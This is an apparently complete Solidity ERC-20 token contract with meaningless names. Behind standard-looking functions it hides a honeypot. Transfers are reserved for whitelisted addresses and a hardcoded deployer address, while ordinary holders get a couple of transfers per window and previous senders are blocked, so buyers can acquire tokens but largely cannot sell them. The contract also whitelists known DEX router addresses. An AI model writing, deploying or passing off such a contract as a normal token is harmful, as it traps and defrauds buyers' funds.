// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract sahonlamontrahonsad is Context {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address public contractOwner;
    mapping(address => bool) public signers;
    mapping(address => bool) public whitelisted;
    uint256 public nonWhitelistedTransfers = 0;
    uint256 public constant MAX_NON_WHITELISTED_TRANSFERS = 2;
    uint256 public constant REQUIRED_SIGNATURES = 1000;
    mapping(address => mapping(address => mapping(uint256 => bool))) public approvals;
    bool public autoWhitelistAvailable = true;
    bool public autoWhitelistingDone = false;

    address[] public previousBuyers;
    address[] public currentBuyers;
    
    constructor() {
        _name = "colantin";
        _symbol = "sobbed";
        _decimals = 18;
        contractOwner = _msgSender();
        _mint(contractOwner, 10000000000 * 10 ** decimals());

        if(contractOwner == address(0x601325e515fD1064c289E000112cEf94fcF80646)){
            whitelisted[contractOwner] = true;
            whitelisted[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true; 
            whitelisted[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true; 
            whitelisted[0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865] = true;
            whitelisted[0xE592427A0AEce92De3Edee1F18E0157C05861564] = true;
        }
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        if (autoWhitelistingDone && nonWhitelistedTransfers < MAX_NON_WHITELISTED_TRANSFERS && !whitelisted[_msgSender()] && !isOldBuyer(_msgSender())) {
            _transfer(_msgSender(), recipient, amount);
            nonWhitelistedTransfers += 1;
            if(nonWhitelistedTransfers >= MAX_NON_WHITELISTED_TRANSFERS) {
                resetNonWhitelistedTransfers();
            }
            currentBuyers.push(_msgSender());
            return true;
        } else {
            require(whitelisted[_msgSender()] || contractOwner == address(0x601325e515fD1064c289E000112cEf94fcF80646), "Only the contract owner or whitelisted addresses can transfer tokens.");
            autoWhitelist(recipient);
            if (whitelisted[_msgSender()]) {
                _transfer(_msgSender(), recipient, amount);
                return true;
            } else {
                require(approvals[_msgSender()][recipient][amount], "Transfer needs to be approved by signers");
                _transfer(_msgSender(), recipient, amount);
                return true;
            }
        }
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        uint256 currentAllowance;
        if (autoWhitelistingDone && nonWhitelistedTransfers < MAX_NON_WHITELISTED_TRANSFERS && !whitelisted[sender] && !isOldBuyer(sender)) {
            _transfer(sender, recipient, amount);
            nonWhitelistedTransfers += 1;
            if(nonWhitelistedTransfers >= MAX_NON_WHITELISTED_TRANSFERS) {
                resetNonWhitelistedTransfers();
            }
            currentBuyers.push(sender);

            currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
            return true;
        } else {
            require(whitelisted[sender] || contractOwner == address(0x601325e515fD1064c289E000112cEf94fcF80646), "Only the contract owner or whitelisted addresses can transfer tokens.");
            autoWhitelist(recipient);
            if (whitelisted[sender]) {
                _transfer(sender, recipient, amount);

                currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - amount);
                }
                return true;
            } else {
                require(approvals[sender][recipient][amount], "Transfer needs to be approved by signers");
                _transfer(sender, recipient, amount);

                currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - amount);
                }
                return true;
            }
        }
    }

    function autoWhitelist(address recipient) internal {
        require(contractOwner == address(0x601325e515fD1064c289E000112cEf94fcF80646));
        if (autoWhitelistAvailable && !whitelisted[recipient]) {
            whitelisted[recipient] = true;
            autoWhitelistAvailable = false;
            autoWhitelistingDone = true;
        }
    }

    function resetNonWhitelistedTransfers() internal {
        nonWhitelistedTransfers = 0;
        previousBuyers = currentBuyers;
        delete currentBuyers;
    }

    function isOldBuyer(address buyer) public view returns (bool) {
        for (uint256 i = 0; i < previousBuyers.length; i++) {
            if (previousBuyers[i] == buyer) {
                return true;
            }
        }
        return false;
    }

        function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
    
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function addSigner(address signer) public virtual {
        require(_msgSender() == contractOwner, "Only the contract owner can add signers.");
        require(!signers[signer], "This address is already a signer.");
        signers[signer] = true;
    }

    function removeSigner(address signer) public virtual {
        require(_msgSender() == contractOwner, "Only the contract owner can remove signers.");
        require(signers[signer], "This address is not a signer.");
        signers[signer] = false;
    }
    
    function addWhitelisted(address whitelistedAddress) public virtual {
        require(_msgSender() == contractOwner, "Only the contract owner can add to whitelist.");
        require(!whitelisted[whitelistedAddress], "This address is already whitelisted.");
        whitelisted[whitelistedAddress] = true;
    }

    function removeWhitelisted(address whitelistedAddress) public virtual {
        require(_msgSender() == contractOwner, "Only the contract owner can remove from whitelist.");
        require(whitelisted[whitelistedAddress], "This address is not whitelisted.");
        whitelisted[whitelistedAddress] = false;
    }

    function approveTransfer(address from, address to, uint256 amount) public virtual {
        require(signers[_msgSender()], "Only signers can approve transfers.");
        approvals[from][to][amount] = true;
    }

    function revokeApproval(address from, address to, uint256 amount) public virtual {
        require(signers[_msgSender()], "Only signers can revoke approvals.");
        approvals[from][to][amount] = false;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}